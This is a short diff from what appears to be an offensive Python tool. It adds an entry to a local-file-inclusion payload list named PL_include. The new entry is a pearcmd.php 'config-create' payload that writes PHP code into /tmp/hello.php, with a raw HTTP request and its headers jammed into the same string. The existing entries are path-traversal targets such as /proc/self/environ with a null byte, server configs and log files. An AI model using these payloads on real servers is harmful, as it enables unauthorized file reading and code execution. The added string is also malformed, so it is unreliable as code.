@@ -77,7 +77,8 @@ def makshell_7(shell):
             slist.append(tmp)
     return slist[::-1]
 
-PL_include = {'/etc/pure-ftpd/pure-ftpd.pdb', '/var/www/log/error_log',
+PL_include = {'+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.phpHTTP/1.1Host:192.168.1.162:8080Accept-Encoding:gzip, deflateAccept:*/*Accept-Language:enUser-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36Connection:close',
+              '/etc/pure-ftpd/pure-ftpd.pdb', '/var/www/log/error_log',
               '../../../../../../../../../proc/self/environ%00', '/etc/ppp/options.xl2tpd.bak',
               '/etc/httpd/conf/httpd.conf', '/etc/httpd/conf/http.conf', '/var/www/html/',
               '../../../../../../proc/self/environ', '/var/log/apache/error.log', '/bin/php.ini',
